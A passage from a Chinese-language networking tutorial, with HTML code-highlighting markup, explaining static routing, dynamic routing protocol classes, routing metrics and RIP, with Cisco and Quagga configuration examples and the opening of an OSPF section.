class="hljs-number">255</span>.<span class="hljs-number">0</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">254</span><br><br># 删除路由<br>route delete <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span><br><br># 修改路由<br>route change <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span> mask <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">253</span><br></code></pre></td></tr></table></figure><p><strong>Cisco路由器</strong>：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs arduino"># 进入配置模式<br>Router&gt; enable<br>Router<span class="hljs-meta"># configure terminal</span><br><br># 添加静态路由<br><span class="hljs-built_in">Router</span>(config)<span class="hljs-meta"># ip route <span class="hljs-string">&lt;目标网络&gt;</span> <span class="hljs-string">&lt;子网掩码&gt;</span> <span class="hljs-string">&lt;下一跳或接口&gt;</span></span><br><br># 示例<br><span class="hljs-built_in">Router</span>(config)<span class="hljs-meta"># ip route 192.168.2.0 255.255.255.0 192.168.1.254</span><br><span class="hljs-built_in">Router</span>(config)<span class="hljs-meta"># ip route 192.168.2.0 255.255.255.0 GigabitEthernet0/1</span><br><br># 添加默认路由<br><span class="hljs-built_in">Router</span>(config)<span class="hljs-meta"># ip route 0.0.0.0 0.0.0.0 192.168.1.1</span><br><br># 查看路由表<br>Router<span class="hljs-meta"># show ip route</span><br><br>Codes: C - connected, S - <span class="hljs-type">static</span>, R - RIP, O - OSPF<br>       * - candidate <span class="hljs-keyword">default</span><br><br>Gateway of last resort is <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span> to network <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><br><br>C    <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span> is directly connected, GigabitEthernet0/<span class="hljs-number">0</span><br>C    <span class="hljs-number">192.168</span><span class="hljs-number">.3</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span> is directly connected, GigabitEthernet0/<span class="hljs-number">1</span><br>S    <span class="hljs-number">192.168</span><span class="hljs-number">.2</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span> [<span class="hljs-number">1</span>/<span class="hljs-number">0</span>] via <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.254</span><br>S*   <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>/<span class="hljs-number">0</span> [<span class="hljs-number">1</span>/<span class="hljs-number">0</span>] via <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span><br></code></pre></td></tr></table></figure><h3 id="3-2-静态路由的优缺点"><a href="#3-2-静态路由的优缺点" class="headerlink" title="3.2 静态路由的优缺点"></a>3.2 静态路由的优缺点</h3><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">优点：<br>✅ 配置简单<br>✅ 无需协议开销<br>✅ 不占用<span class="hljs-variable">CPU</span>和带宽<br>✅ 安全（不会被欺骗）<br>✅ 可预测（路径固定）<br>✅ 适合小型网络<br><br>缺点：<br>❌ 不能自动适应网络变化<br>❌ 链路故障无法自动切换<br>❌ 大型网络配置繁琐<br>❌ 人工配置容易出错<br>❌ 维护成本高<br>❌ 扩展性差<br><br>使用场景：<br>✅ 小型网络（<span class="hljs-operator">&lt;</span><span class="hljs-number">10</span>个路由器）<br>✅ 简单拓扑<br>✅ 末端网络（<span class="hljs-built_in">Stub</span> <span class="hljs-variable">Network</span>）<br>✅ 默认路由<br>✅ 特定安全需求<br>✅ 实验和测试环境<br></code></pre></td></tr></table></figure><hr><h2 id="4-动态路由协议"><a href="#4-动态路由协议" class="headerlink" title="4. 动态路由协议"></a>4. 动态路由协议</h2><h3 id="4-1-动态路由概述"><a href="#4-1-动态路由概述" class="headerlink" title="4.1 动态路由概述"></a>4.1 动态路由概述</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs markdown">动态路由 = Dynamic Routing<br><br>特点：<br><span class="hljs-bullet">-</span> 路由器自动学习路由<br><span class="hljs-bullet">-</span> 自动适应网络变化<br><span class="hljs-bullet">-</span> 链路故障自动切换<br><span class="hljs-bullet">-</span> 路由器之间交换信息<br><br>工作原理：<br><span class="hljs-bullet">1.</span> 路由器启动<br><span class="hljs-bullet">2.</span> 发现邻居路由器<br><span class="hljs-bullet">3.</span> 交换路由信息<br><span class="hljs-bullet">4.</span> 计算最佳路径<br><span class="hljs-bullet">5.</span> 更新路由表<br><span class="hljs-bullet">6.</span> 定期更新或事件触发更新<br><br>优点：<br>✅ 自动学习路由<br>✅ 自动适应变化<br>✅ 链路冗余和负载均衡<br>✅ 适合大型网络<br>✅ 减少人工配置<br><br>缺点：<br>❌ 占用带宽（协议报文）<br>❌ 占用CPU（路由计算）<br>❌ 占用内存（路由表）<br>❌ 配置复杂<br>❌ 收敛时间（网络变化到稳定的时间）<br>❌ 可能被攻击<br><br>何时使用？<br><span class="hljs-bullet">-</span> 大型网络<br><span class="hljs-bullet">-</span> 复杂拓扑<br><span class="hljs-bullet">-</span> 需要自动故障恢复<br><span class="hljs-bullet">-</span> 网络经常变化<br></code></pre></td></tr></table></figure><h3 id="4-2-动态路由协议分类"><a href="#4-2-动态路由协议分类" class="headerlink" title="4.2 动态路由协议分类"></a>4.2 动态路由协议分类</h3><p><strong>按工作范围分类</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> IGP（Interior Gateway Protocol）<br>   内部网关协议<br><span class="hljs-bullet">   -</span> 在自治系统（AS）内使用<br><span class="hljs-bullet">   -</span> 示例：RIP, OSPF, IS-IS, EIGRP<br><br><span class="hljs-bullet">2.</span> EGP（Exterior Gateway Protocol）<br>   外部网关协议<br><span class="hljs-bullet">   -</span> 在自治系统之间使用<br><span class="hljs-bullet">   -</span> 示例：BGP<br><br>自治系统（AS）：<br><span class="hljs-bullet">-</span> 由单一组织管理的网络集合<br><span class="hljs-bullet">-</span> 有统一的路由策略<br><span class="hljs-bullet">-</span> 分配唯一的AS号<br><span class="hljs-bullet">-</span> 示例：<br><span class="hljs-bullet">  -</span> AS 4134：中国电信<br><span class="hljs-bullet">  -</span> AS 15169：Google<br><span class="hljs-bullet">  -</span> AS 32934：Facebook<br><br>┌─────────────────────────────────────────┐<br>│          互联网                         │<br>├──────────────┬──────────────┬───────────┤<br>│   AS 100     │   AS 200     │  AS 300   │<br>│   (公司A)    │   (公司B)    │  (ISP)    │<br>├──────────────┼──────────────┼───────────┤<br>│  内部使用    │  内部使用    │ 内部使用  │<br>│  OSPF (IGP)  │  RIP (IGP)   │ OSPF (IGP)│<br>├──────────────┴──────────────┴───────────┤<br>│        AS之间使用BGP (EGP)              │<br>└─────────────────────────────────────────┘<br></code></pre></td></tr></table></figure><p><strong>按算法分类</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 距离矢量（Distance Vector）<br><span class="hljs-bullet">   -</span> 基于Bellman-Ford算法<br><span class="hljs-bullet">   -</span> 只知道方向和距离<br><span class="hljs-bullet">   -</span> 定期广播整个路由表<br><span class="hljs-bullet">   -</span> 收敛慢<br><span class="hljs-bullet">   -</span> 协议：RIP, IGRP<br><br>   特点：<br><span class="hljs-bullet">   -</span> &quot;谣言路由&quot;<br><span class="hljs-bullet">   -</span> 路由器只从邻居学习<br><span class="hljs-bullet">   -</span> 不知道完整拓扑<br><br>   比喻：<br>   问路：&quot;去火车站怎么走？&quot;<br>   答：&quot;我不知道在哪，但往前走3个路口，问那边的人&quot;<br><br><span class="hljs-bullet">2.</span> 链路状态（Link State）<br><span class="hljs-bullet">   -</span> 基于Dijkstra算法（SPF）<br><span class="hljs-bullet">   -</span> 知道整个网络拓扑<br><span class="hljs-bullet">   -</span> 只传播链路状态变化<br><span class="hljs-bullet">   -</span> 收敛快<br><span class="hljs-bullet">   -</span> 协议：OSPF, IS-IS<br><br>   特点：<br><span class="hljs-bullet">   -</span> 每个路由器有完整拓扑图<br><span class="hljs-bullet">   -</span> 独立计算最短路径<br><span class="hljs-bullet">   -</span> 更准确，更快<br><br>   比喻：<br>   有一张完整地图，自己计算最短路径<br><br><span class="hljs-bullet">3.</span> 混合型（Hybrid）<br><span class="hljs-bullet">   -</span> 结合两者优点<br><span class="hljs-bullet">   -</span> 协议：EIGRP（Cisco专有）<br><br>对比：<br>┌──────────────┬────────────────┬────────────────┐<br>│    特性      │   距离矢量     │    链路状态    │<br>├──────────────┼────────────────┼────────────────┤<br>│ 拓扑知识     │   部分（邻居） │   完整         │<br>│ 路由计算     │   分布式       │   独立         │<br>│ 更新方式     │   整个路由表   │   链路状态变化 │<br>│ 收敛速度     │   慢           │   快           │<br>│ CPU占用      │   低           │   高           │<br>│ 内存占用     │   低           │   高           │<br>│ 带宽占用     │   高（定期）   │   低（变化时） │<br>│ 扩展性       │   差           │   好           │<br>└──────────────┴────────────────┴────────────────┘<br></code></pre></td></tr></table></figure><h3 id="4-3-路由度量（Metric）"><a href="#4-3-路由度量（Metric）" class="headerlink" title="4.3 路由度量（Metric）"></a>4.3 路由度量（Metric）</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs markdown">度量 = Metric = 路由的&quot;代价&quot;<br><br>作用：<br><span class="hljs-bullet">-</span> 评估路径的优劣<br><span class="hljs-bullet">-</span> 选择最佳路径<br><span class="hljs-bullet">-</span> 数值越小越好<br><br>常见度量类型：<br><br><span class="hljs-bullet">1.</span> 跳数（Hop Count）<br><span class="hljs-bullet">   -</span> 经过的路由器数量<br><span class="hljs-bullet">   -</span> RIP使用<br><span class="hljs-bullet">   -</span> 简单但不准确<br><span class="hljs-bullet">   -</span> 最大15跳<br><br>   示例：<br>   路径1: A → B → C → D (3跳)<br>   路径2: A → E → D (2跳，选择此路径)<br>   但路径2可能是慢速链路！<br><br><span class="hljs-bullet">2.</span> 带宽（Bandwidth）<br><span class="hljs-bullet">   -</span> 链路速度<br><span class="hljs-bullet">   -</span> OSPF默认使用<br><span class="hljs-bullet">   -</span> Cost = 10^8 / 带宽(bps)<br><br>   示例：<br>   100Mbps链路：Cost = 10^8 / 10^8 = 1<br>   10Mbps链路：Cost = 10^8 / 10^7 = 10<br>   1Mbps链路：Cost = 10^8 / 10^6 = 100<br><br><span class="hljs-bullet">3.</span> 延迟（Delay）<br><span class="hljs-bullet">   -</span> 传输时间<br><span class="hljs-bullet">   -</span> EIGRP考虑<br><span class="hljs-bullet">   -</span> 单位：微秒<br><br><span class="hljs-bullet">4.</span> 负载（Load）<br><span class="hljs-bullet">   -</span> 链路利用率<br><span class="hljs-bullet">   -</span> EIGRP考虑<br><br><span class="hljs-bullet">5.</span> 可靠性（Reliability）<br><span class="hljs-bullet">   -</span> 链路质量<br><span class="hljs-bullet">   -</span> 丢包率<br><span class="hljs-bullet">   -</span> EIGRP考虑<br><br><span class="hljs-bullet">6.</span> MTU（最大传输单元）<br><span class="hljs-bullet">   -</span> EIGRP考虑<br><br>复合度量：<br>EIGRP度量 = [K1×带宽 + (K2×带宽)/(256-负载) + K3×延迟] × [K5/(可靠性+K4)]<br><br>默认：K1=K3=1, K2=K4=K5=0<br>简化为：度量 = 带宽 + 延迟<br></code></pre></td></tr></table></figure><hr><h2 id="5-RIP协议详解"><a href="#5-RIP协议详解" class="headerlink" title="5. RIP协议详解"></a>5. RIP协议详解</h2><h3 id="5-1-RIP概述"><a href="#5-1-RIP概述" class="headerlink" title="5.1 RIP概述"></a>5.1 RIP概述</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">RIP = Routing Information Protocol<br>路由信息协议<br><br>版本：<br><span class="hljs-bullet">- </span>RIP v1（1988）：有类路由，不支持VLSM<br><span class="hljs-bullet">- </span>RIP v2（1993）：无类路由，支持VLSM，支持认证<br><span class="hljs-bullet">- </span>RIPng：IPv6版本<br><br>特点：<br><span class="hljs-bullet">- </span>距离矢量协议<br><span class="hljs-bullet">- </span>度量：跳数<br><span class="hljs-bullet">- </span>最大跳数：15（16表示不可达）<br><span class="hljs-bullet">- </span>更新周期：30秒<br><span class="hljs-bullet">- </span>失效时间：180秒<br><span class="hljs-bullet">- </span>刷新时间：240秒<br><span class="hljs-bullet">- </span>端口：UDP 520<br><span class="hljs-bullet">- </span>管理距离：120<br><br>适用场景：<br>✅ 小型网络<br>✅ 简单拓扑<br>✅ 兼容性要求高<br>✅ 设备性能有限<br><br>不适用场景：<br>❌ 大型网络（&gt;15跳）<br>❌ 需要快速收敛<br>❌ 复杂拓扑<br>❌ 需要精确控制<br></code></pre></td></tr></table></figure><h3 id="5-2-RIP工作原理"><a href="#5-2-RIP工作原理" class="headerlink" title="5.2 RIP工作原理"></a>5.2 RIP工作原理</h3><p><strong>路由更新</strong>：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">RIP更新机制：<br><br><span class="hljs-number">1</span>. 定期更新（每<span class="hljs-number">30</span>秒）<br>   - 路由器广播整个路由表<br>   - 地址：<br>     * RIPv1: <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>（广播）<br>     * RIPv2: <span class="hljs-number">224</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">9</span>（组播）<br><br><span class="hljs-number">2</span>. 触发更新<br>   - 路由变化时立即发送<br>   - 防止路由环路<br><br><span class="hljs-number">3</span>. 邻居发现<br>   - 通过接收更新发现邻居<br>   - 没有Hello机制<br><br>路由表项包含：<br>- 目标网络<br>- 度量（跳数）<br>- 下一跳<br>- 超时定时器<br><br>示例：<br><br>路由器R1连接：<br>- 网络A: <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span>（直连，度量<span class="hljs-number">0</span>）<br>- 网络B: <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span>（直连，度量<span class="hljs-number">0</span>）<br><br>R1广播更新给邻居R2：<br>Network         Metric<br><span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span>    <span class="hljs-number">1</span>      (度量+<span class="hljs-number">1</span>)<br><span class="hljs-number">192.168.2.0</span>/<span class="hljs-number">24</span>    <span class="hljs-number">1</span>      (度量+<span class="hljs-number">1</span>)<br><br>R2接收并更新路由表：<br>Network         Next Hop    Metric<br><span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span>  R1          <span class="hljs-number">1</span><br><span class="hljs-number">192.168.2.0</span>/<span class="hljs-number">24</span>  R1          <span class="hljs-number">1</span><br><span class="hljs-number">192.168.3.0</span>/<span class="hljs-number">24</span>  直连        <span class="hljs-number">0</span><br><br>R2再广播给R3...<br></code></pre></td></tr></table></figure><p><strong>防环机制</strong>：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">RIP防环机制：<br><br>问题：距离矢量协议容易产生路由环路<br><br>示例：<br><span class="hljs-built_in">R1</span> ← → <span class="hljs-built_in">R2</span> ← → <span class="hljs-built_in">R3</span><br> ↓<br>网络A<br><br>正常情况：<br><span class="hljs-symbol">R1:</span> 网络A, 度量<span class="hljs-number">0</span>（直连）<br><span class="hljs-symbol">R2:</span> 网络A via <span class="hljs-built_in">R1</span>, 度量<span class="hljs-number">1</span><br><span class="hljs-symbol">R3:</span> 网络A via <span class="hljs-built_in">R2</span>, 度量<span class="hljs-number">2</span><br><br><span class="hljs-built_in">R1</span>-网络A链路断开：<br><span class="hljs-symbol">R1:</span> 网络A不可达<br><span class="hljs-symbol">R2:</span> 还记录着网络A via <span class="hljs-built_in">R1</span>, 度量<span class="hljs-number">1</span>（未更新）<br><span class="hljs-built_in">R1</span>收到<span class="hljs-built_in">R2</span>的更新：认为可以通过<span class="hljs-built_in">R2</span>到达网络A, 度量<span class="hljs-number">2</span><br><span class="hljs-built_in">R2</span>收到<span class="hljs-built_in">R1</span>的更新：更新为度量<span class="hljs-number">3</span><br>...无限计数！<br><br>防环机制：<br><br><span class="hljs-number">1.</span> 最大跳数（Maximum Hop Count）<br>   - <span class="hljs-number">16</span>表示不可达<br>   - 限制无限计数<br>   - 但限制了网络规模<br><br><span class="hljs-number">2.</span> 水平分割（Split Horizon）<br>   - 不向接收路由的接口发回该路由<br>   - 示例：<br>     <span class="hljs-built_in">R1</span>从<span class="hljs-built_in">R2</span>学到网络A<br>     <span class="hljs-built_in">R1</span>不会向<span class="hljs-built_in">R2</span>通告网络A<br><br><span class="hljs-number">3.</span> 毒性逆转（Poison Reverse）<br>   - 向源接口通告不可达（度量<span class="hljs-number">16</span>）<br>   - 比水平分割更积极<br>   - 示例：<br>     <span class="hljs-built_in">R1</span>从<span class="hljs-built_in">R2</span>学到网络A<br>     <span class="hljs-built_in">R1</span>向<span class="hljs-built_in">R2</span>通告：网络A度量<span class="hljs-number">16</span>（不可达）<br><br><span class="hljs-number">4.</span> 抑制定时器（Holddown Timer）<br>   - 路由失效后，在一定时间内不接受更新<br>   - 防止错误路由信息<br>   - 典型：<span class="hljs-number">180</span>秒<br><br><span class="hljs-number">5.</span> 触发更新（Triggered Update）<br>   - 路由变化立即发送<br>   - 加快收敛<br></code></pre></td></tr></table></figure><h3 id="5-3-RIP配置示例"><a href="#5-3-RIP配置示例" class="headerlink" title="5.3 RIP配置示例"></a>5.3 RIP配置示例</h3><p><strong>Cisco路由器</strong>：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment"># 启用RIP</span><br>Router(<span class="hljs-built_in">config</span>)<span class="hljs-comment"># router rip</span><br><br><span class="hljs-comment"># 指定版本</span><br>Router(<span class="hljs-built_in">config</span>-router)<span class="hljs-comment"># version 2</span><br><br><span class="hljs-comment"># 通告网络（有类网络）</span><br>Router(<span class="hljs-built_in">config</span>-router)<span class="hljs-comment"># network 192.168.1.0</span><br>Router(<span class="hljs-built_in">config</span>-router)<span class="hljs-comment"># network 192.168.2.0</span><br><br><span class="hljs-comment"># 关闭自动汇总（RIPv2）</span><br>Router(<span class="hljs-built_in">config</span>-router)<span class="hljs-comment"># no auto-summary</span><br><br><span class="hljs-comment"># 配置被动接口（不发送更新）</span><br>Router(<span class="hljs-built_in">config</span>-router)<span class="hljs-comment"># passive-interface GigabitEthernet0/0</span><br><br><span class="hljs-comment"># 配置默认路由传播</span><br>Router(<span class="hljs-built_in">config</span>-router)<span class="hljs-comment"># default-information originate</span><br><br><span class="hljs-comment"># 查看RIP配置</span><br>Router<span class="hljs-comment"># show ip protocols</span><br><br><span class="hljs-comment"># 查看RIP数据库</span><br>Router<span class="hljs-comment"># show ip rip database</span><br><br><span class="hljs-comment"># 调试RIP</span><br>Router<span class="hljs-comment"># debug ip rip</span><br></code></pre></td></tr></table></figure><p><strong>Linux（Quagga&#x2F;FRRouting）</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装Quagga</span><br><span class="hljs-built_in">sudo</span> apt-get install quagga<br><br><span class="hljs-comment"># 配置RIP</span><br><span class="hljs-built_in">sudo</span> vtysh<br>configure terminal<br>router rip<br>  version 2<br>  network 192.168.1.0/24<br>  network 192.168.2.0/24<br>  <span class="hljs-built_in">exit</span><br><span class="hljs-built_in">exit</span><br>write memory<br></code></pre></td></tr></table></figure><hr><h2 id="6-OSPF协议基础"><a href="#6-OSPF协议基础" class="headerlink" title="6. OSPF协议基础"></a>6. OSPF协议基础</h2><h3 id="6-1-OSPF概述"><a href="#6-1-OSPF概述" class="headerlink" title="6.1 OSPF概述"></a>6.1 OSPF概述</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">OSPF = Open Shortest Path First<br>开放最短路径优先<br><br>特点：<br><span class="hljs-bullet">- </span>链路状态协议<br><span class="hljs-bullet">- </span>基于Dijkstra算法（SPF）<br><span class="hljs-bullet">- </span>度量：Cost（基于带宽）<br><span class="hljs-bullet">- </span>支持VLSM和CIDR<br><span class="hljs-bullet">- </span>快速收敛<br><span 